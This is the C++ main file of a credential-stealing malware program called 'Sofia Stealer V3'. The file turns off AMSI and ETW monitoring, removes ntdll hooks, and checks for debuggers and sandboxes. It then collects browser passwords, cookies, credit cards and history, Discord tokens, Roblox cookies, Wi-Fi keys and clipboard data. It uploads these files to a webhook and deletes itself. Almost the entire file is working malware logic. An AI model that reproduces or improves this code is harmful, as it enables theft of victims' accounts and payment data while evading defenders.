#include <windows.h>
#include <sstream>
#include <algorithm>
#include "core/Internal.h"
#include "core/Obfuscation.h"
#include "core/Bypass.h"
#include "core/NtdllUnhook.h"
#include "core/SleepObf.h"
#include "utils/DynamicAPI.h"
#include "utils/Config.h"
#include "modules/AntiAnalysis.h"
#include "modules/SystemInfo.h"
#include "modules/Chromium.h"
#include "modules/Discord.h"
#include "modules/Roblox.h"
#include "modules/FileGrabber.h"
#include "modules/WiFi.h"
#include "modules/Clipboard.h"
#include "modules/Webhook.h"
#include "utils/Impersonator.h"
#include "../DebugLog.h"
using namespace Modules;

// ── Parallel collection result container ───────────────────────────
// Each collect thread writes into one field; main thread reads after join.
// No mutex needed — each field written by exactly one thread.
struct CollectResults {
    // Chromium
    std::vector<Account>        chromium;
    std::string txtPasswords, txtCookies, txtCards, txtHistory;
    int cntPw = 0, cntCk = 0, cntCd = 0, cntHi = 0;
    // Discord
    std::vector<DiscordAccount> discord;
    std::string txtDiscord;
    int validTokens = 0;
    // Roblox
    std::vector<std::string>    roblox;
    std::string txtRoblox;
    // WiFi
    std::vector<WiFiRecord>     wifi;
    std::string txtWifi;
    // Clipboard
    ClipboardData               clip;
    std::string txtClipboard;
    bool hasClip = false;
    // SystemInfo
    SystemInfoData              sys;
    std::string txtSys;
    volatile LONG               sysReady = 0;
};

// ── Worker thread procs ─────────────────────────────────────────────
// Each captures a pointer to the shared CollectResults and writes its section.
// Using __stdcall for NtCreateThreadEx compatibility.

static DWORD WINAPI ThreadChromium(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->chromium = Chromium::Grab();
    for (auto& a : r->chromium) {
        std::string line = "Browser: " + a.Application + " | URL: " + a.URL
                         + " | User: " + a.UserName + " | Pass: " + a.Password + "\n";
        if      (a.Type == "Password")   { r->txtPasswords += line; ++r->cntPw; }
        else if (a.Type == "Cookie")     { r->txtCookies   += line; ++r->cntCk; }
        else if (a.Type == "CreditCard") { r->txtCards     += line; ++r->cntCd; }
        else if (a.Type == "History")    { r->txtHistory   += line; ++r->cntHi; }
    }
    if (r->txtPasswords.empty()) r->txtPasswords = "No passwords found.\n";
    if (r->txtCookies.empty())   r->txtCookies   = "No cookies found.\n";
    if (r->txtCards.empty())     r->txtCards     = "No credit cards found.\n";
    if (r->txtHistory.empty())   r->txtHistory   = "No history found.\n";
    SLOG("[+] [T] Chromium: %d pw %d ck %d cd %d hi", r->cntPw, r->cntCk, r->cntCd, r->cntHi);
    return 0;
}

static DWORD WINAPI ThreadDiscord(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->discord = Discord::Grab();
    r->txtDiscord = Discord::Format(r->discord);
    r->validTokens = (int)std::count_if(r->discord.begin(), r->discord.end(),
        [](const DiscordAccount& a){ return a.Valid; });
    SLOG("[+] [T] Discord: %d total %d valid", (int)r->discord.size(), r->validTokens);
    return 0;
}

static DWORD WINAPI ThreadRoblox(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->roblox = Roblox::Grab();
    int n = 1;
    for (auto& c : r->roblox)
        r->txtRoblox += "Cookie #" + std::to_string(n++) + ":\n" + c + "\n\n";
    if (r->txtRoblox.empty()) r->txtRoblox = "No Roblox cookies found.\n";
    SLOG("[+] [T] Roblox: %d cookies", (int)r->roblox.size());
    return 0;
}

static DWORD WINAPI ThreadWifi(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->wifi = WiFi::Grab();
    r->txtWifi = WiFi::Format(r->wifi);
    SLOG("[+] [T] WiFi: %d profiles", (int)r->wifi.size());
    return 0;
}

static DWORD WINAPI ThreadClipboard(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->clip = Clipboard::Grab();
    r->txtClipboard = Clipboard::Format(r->clip);
    r->hasClip = (r->clip.Type != "Empty");
    SLOG("[+] [T] Clipboard: %s", r->clip.Type.c_str());
    return 0;
}

static DWORD WINAPI ThreadSysInfo(LPVOID p) {
    auto* r = (CollectResults*)p;
    r->sys = SystemInfo::Collect();
    r->txtSys = SystemInfo::Format(r->sys);
    InterlockedExchange(&r->sysReady, 1);
    SLOG("[+] [T] SysInfo: %s@%s", r->sys.Username.c_str(), r->sys.Hostname.c_str());
    return 0;
}

// ── Spawn a raw Win32 thread (fallback to CreateThread via GPA) ─────
static HANDLE SpawnThread(LPTHREAD_START_ROUTINE fn, LPVOID param) {
    // Try NtCreateThreadEx first (no CreateThread import in IAT)
    HANDLE hThread = NULL;
    NTSTATUS st = Internal::NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        (HANDLE)-1, (PVOID)fn, param,
        0, 0, 0, 0, NULL);
    if (st == 0 && hThread) return hThread;
    // Fallback: resolve CreateThread via GetProcAddress
    auto k32Str = OBFS_S("kernel32.dll");
    HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
    if (hK32 && Internal::_GetProcAddress) {
        auto ctStr = OBFS_S("CreateThread");
        typedef HANDLE(WINAPI* CT_t)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                     LPTHREAD_START_ROUTINE, LPVOID,
                                     DWORD, LPDWORD);
        auto pCT = (CT_t)Internal::_GetProcAddress(hK32, ctStr.c_str());
        if (pCT) hThread = pCT(NULL, 0, fn, param, 0, NULL);
    }
    return hThread;
}

// ── Wait for a thread handle with NtWaitForSingleObject ─────────────
static void JoinThread(HANDLE hThread) {
    if (!hThread) return;
    Internal::NtWaitForSingleObject(hThread, FALSE, NULL);
    Internal::NtClose(hThread);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SLOG_INIT();
    SLOG("--- Sofia Stealer V3 ---");

    // ── 1. Core stealth init (must be sequential) ───────────────────
    if (!Internal::Initialize()) {
        SLOG("[-] Core stealth engine init FAILED");
        return 0;
    }
    SLOG("[+] Core stealth engine initialized");

    NtdllUnhook::Execute();
    SLOG("[+] Ntdll unhooking completed");

    Bypass::ExecuteAll();
    SLOG("[+] AMSI/ETW bypass completed");

    if (!DynAPI::Initialize()) {
        SLOG("[-] Failed to initialize Dynamic APIs.");
        return 0;
    }
    SLOG("[+] Dynamic APIs initialized.");

    if (!Utils::Impersonator::IsAdmin()) {
        SLOG("[!] WARNING: Not running as Administrator.");
    }

    WSADATA wsa;
    if (Internal::_WSAStartup) {
        Internal::_WSAStartup(MAKEWORD(2, 2), &wsa);
    }
    SLOG("[+] WSA initialized.");

    // ── 2. Anti-analysis (sequential — must pass before doing anything) ─
    JUNK_CODE_LARGE
    if (!AntiAnalysis::SetMutex()) {
        SLOG("[-] Found another instance running. Exiting.");
        return 0;
    }
    AntiAnalysis::HideFromScreenCapture();
    if (AntiAnalysis::IsDebugger() || AntiAnalysis::IsSandbox()) {
        SLOG("[-] Anti-analysis check failed. Terminating.");
        return 0;
    }
    SLOG("[+] Anti-analysis gauntlet passed.");
    JUNK_CODE_SMALL

    // ── 3. Obfuscated sleep (short — randomized 1-2s) ───────────────
    SLOG("[*] Starting obfuscated sleep...");
    SleepObf::ObfuscatedSleep(1000 + (Internal::SecureRand(1000)));
    SLOG("[+] Obfuscated sleep complete.");

    // ── 4. Parallel data collection ──────────────────────────────────
    // All 6 modules run simultaneously. Total time ≈ slowest single module
    // instead of sum of all modules.
    JUNK_CODE_SMALL
    SLOG("[*] Launching parallel collection threads...");
    CollectResults res;

    HANDLE hThreads[6];
    hThreads[0] = SpawnThread(ThreadChromium,  &res);
    hThreads[1] = SpawnThread(ThreadDiscord,   &res);
    hThreads[2] = SpawnThread(ThreadRoblox,    &res);
    hThreads[3] = SpawnThread(ThreadWifi,      &res);
    hThreads[4] = SpawnThread(ThreadClipboard, &res);
    hThreads[5] = SpawnThread(ThreadSysInfo,   &res);

    SLOG("[*] Threads launched — waiting for completion...");
    for (int i = 0; i < 6; ++i) JoinThread(hThreads[i]);
    SLOG("[+] All collection threads finished.");

    // ── 5. Optional: file grabbing (runs after parallel phase) ───────
    if (Config::GrabFiles) {
        SLOG("[*] Grabbing sensitive files...");
        FileGrabber::Grab();
        SLOG("[+] File grabbing complete.");
    }

    // ── 6. Init persistent webhook session before sending ────────────
    std::string wh = Config::GetWebhookURL();
    SLOG("[*] Initializing webhook session...");
    if (!Webhook::InitSession()) {
        SLOG("[-] Failed to initialize webhook session.");
    }

    // ── 7. Send summary embed (fast, no file upload) ─────────────────
    SLOG("[*] Building and sending summary embed...");
    std::string embed = Webhook::BuildSummaryEmbed(
        res.sys.Hostname, res.sys.Username, res.sys.OS, res.sys.PublicIP,
        res.cntPw, res.cntCk, res.cntCd, res.validTokens,
        (int)res.wifi.size(), res.hasClip);
    Webhook::SendEmbed(wh, embed);
    SLOG("[+] Summary embed sent.");

    // ── 8. Exfiltrate files — no fixed delays, rate-limit handled ────
    // Order: high-value first (passwords, tokens) so partial exfil still wins
    SLOG("[*] Exfiltrating collected data...");
    Webhook::SendFile(wh, res.txtSys,       S("SystemInfo.txt"));
    SLOG("  [+] SystemInfo.txt");
    Webhook::SendFile(wh, res.txtPasswords, S("Passwords.txt"));
    SLOG("  [+] Passwords.txt");
    Webhook::SendFile(wh, res.txtDiscord,   S("DiscordTokens.txt"));
    SLOG("  [+] DiscordTokens.txt");
    Webhook::SendFile(wh, res.txtCookies,   S("Cookies.txt"));
    SLOG("  [+] Cookies.txt");
    Webhook::SendFile(wh, res.txtCards,     S("CreditCards.txt"));
    SLOG("  [+] CreditCards.txt");
    Webhook::SendFile(wh, res.txtRoblox,    S("RobloxCookies.txt"));
    SLOG("  [+] RobloxCookies.txt");
    Webhook::SendFile(wh, res.txtWifi,      S("WiFiPasswords.txt"));
    SLOG("  [+] WiFiPasswords.txt");
    Webhook::SendFile(wh, res.txtHistory,   S("History.txt"));
    SLOG("  [+] History.txt");
    Webhook::SendFile(wh, res.txtClipboard, S("Clipboard.txt"));
    SLOG("  [+] Clipboard.txt");
    SLOG("[+] Exfiltration complete.");

    // ── 9. Cleanup ───────────────────────────────────────────────────
    Webhook::CloseSession();
    if (Internal::_WSACleanup) Internal::_WSACleanup();

    // ── 10. Self-delete via Alternate Data Stream rename ─────────────
    SLOG("[*] Performing self-delete...");
    {
        typedef BOOL(WINAPI* SetFileInformationByHandle_t)(HANDLE, int, LPVOID, DWORD);
        typedef HANDLE(WINAPI* CreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
        typedef DWORD(WINAPI* GetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);

        auto k32Str = OBFS_S("kernel32.dll");
        HMODULE hK32 = Internal::_GetModuleHandleA(k32Str.c_str());
        if (hK32) {
            auto sfih = (SetFileInformationByHandle_t)Internal::_GetProcAddress(hK32, OBFS_S("SetFileInformationByHandle").c_str());
            auto cfw  = (CreateFileW_t)Internal::_GetProcAddress(hK32, OBFS_S("CreateFileW").c_str());
            auto gmfw = (GetModuleFileNameW_t)Internal::_GetProcAddress(hK32, OBFS_S("GetModuleFileNameW").c_str());

            wchar_t selfPathW[MAX_PATH] = {};
            if (sfih && cfw && gmfw && gmfw(NULL, selfPathW, MAX_PATH)) {
                HANDLE hSelf = cfw(selfPathW, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hSelf != INVALID_HANDLE_VALUE) {
                    struct {
                        BOOLEAN ReplaceIfExists;
                        HANDLE  RootDirectory;
                        ULONG   FileNameLength;
                        wchar_t FileName[3];
                    } renameInfo = {};
                    renameInfo.FileName[0] = L':';
                    renameInfo.FileName[1] = L'x';
                    renameInfo.FileName[2] = L'\0';
                    renameInfo.FileNameLength = 2 * sizeof(wchar_t);
                    sfih(hSelf, 3, &renameInfo, sizeof(renameInfo));
                    Internal::_CloseHandle(hSelf);

                    hSelf = cfw(selfPathW, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hSelf != INVALID_HANDLE_VALUE) {
                        struct { BOOLEAN DeleteFile; } dispInfo = { TRUE };
                        sfih(hSelf, 4, &dispInfo, sizeof(dispInfo));
                        Internal::_CloseHandle(hSelf);
                        SLOG("[+] Self-delete via stream rename OK.");
                    }
                }
            }
        }
    }
    SLOG("[+] Self-delete scheduled. Goodbye.");
    SLOG_CLOSE();
    return 0;
}
